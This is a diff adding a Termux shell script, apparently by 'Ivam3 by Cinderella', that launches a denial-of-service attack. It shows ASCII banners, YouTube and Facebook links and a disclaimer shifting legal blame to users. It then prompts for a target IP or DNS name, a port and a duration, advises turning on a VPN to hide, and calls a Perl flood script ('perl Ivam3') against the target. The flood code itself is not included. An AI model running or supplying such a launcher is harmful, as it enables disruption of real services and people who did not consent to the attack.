@@ -1,0 +1,90 @@
+#!/data/data/com.termux/files/usr/bin
+#Coded by Ivam3 on 15/01/18
+
+clear
+
+#BANNER
+
+setterm -foreground white
+	  echo "  	 -{ Denial of Service Attack Tool (DoS-A-Tool) } "
+	  echo "               -{ SO > Android - Only for Termux } "
+	  echo "	                 -{ Coded by } "
+setterm -foreground green
+          echo "		==============================";
+          echo "		.___                  _______";
+          echo "		|   |__ ______   ___  \_____ \ ";
+	  echo "		|   \ \/ /\__ \ /   \    (__ <,";
+          echo "		|   |\   / __ \| Y Y \ \      \ ";
+	  echo "		|___| \_/ (____|__|_| /______ /";
+          echo "		              \/    \/      \/ ";
+          echo "		====== By ___ Cinderella ======";
+          echo
+	  sleep 1
+setterm -foreground blue
+          echo "		      [---] Join me on [---]"
+	  echo "	  [-] www.youtube.com/c/ivam3bycinderella [-]"
+	  echo "	         [-] fb.me/ivam3bycinderella [-]"
+	  sleep 2
+	  echo
+setterm -foreground red
+	  echo " 		      [---] DISCLAIMER [---]"
+setterm -foreground white
+	  echo "This tool was created for pentesting and computer security tests.
+	  If the law is violated with its use,
+this would be the responsibility of the user who handled it"
+	  echo
+setterm -foreground red
+	  echo "		   [-] Use At Your Own Risk [-]"
+	  echo
+	  sleep 2
+setterm -foreground white
+	  echo
+	  echo "Set IP or DNS target >>  \c"
+	  read Target
+	  echo
+	  echo "Set your Port >>  \c"
+	  read Lport
+	  echo
+	  echo "Set a sending pkg time in seconds (0 = unlimited) >>  \c"
+	  read Time
+	  echo
+setterm -foreground red
+	  sleep 1
+	  echo "[w] Don not forget active your VPN"
+	  echo
+setterm -foreground white
+          echo "[+] Press ENTER to start or Ctrl+c to shut down"
+          read ENTER
+	  clear
+
+#Banner
+
+clear
+setterm -foreground blue
+        echo "              . .IIIII             .II"
+        echo "  IIIIIIIIII. I  II  .    II..IIII-Ivam3-IIIIIIIII"
+        echo " .  .IIIIII  II             IIIIIIIIIIIIIIIIIIIII  I."
+        echo "    .IIIII.III I        IIIByIII-II+Cinderella+III"
+        echo "   .IIIIIIII           II  .IIIII IIIIIIIIIIII. I"
+        echo "    IIIIII             IIII I  III+DDoS+IIII I"
+        echo "    .II               IIIIIIIIIIIII  IIIIIIIII"
+        echo "       I.           .II+ATTACK+II    I   II  I"
+        echo "         .IIII        IIIIIIIIIIII     .       I"
+        echo "          IIIII.          IIIIII           . I."
+        echo "         +HACKING+         IIIII             ..I  II ."
+        echo "          IIIIIII          IIII...             IIII"
+        echo "            IIII           III. I            IIQEPDII"
+        echo "            III             I                I  III"
+        echo "            II                                   I   ."
+        echo "             I     Ivam3 by Cinderella               "
+	echo "
+	"
+setterm -foreground white --bold off
+	sleep 1
+setterm -foreground green
+	echo "[+] Starting a Denial of Service Attack to $Target"
+setterm -foreground white
+	sleep 3
+	echo
+
+	perl Ivam3 $Target $Lport $Time
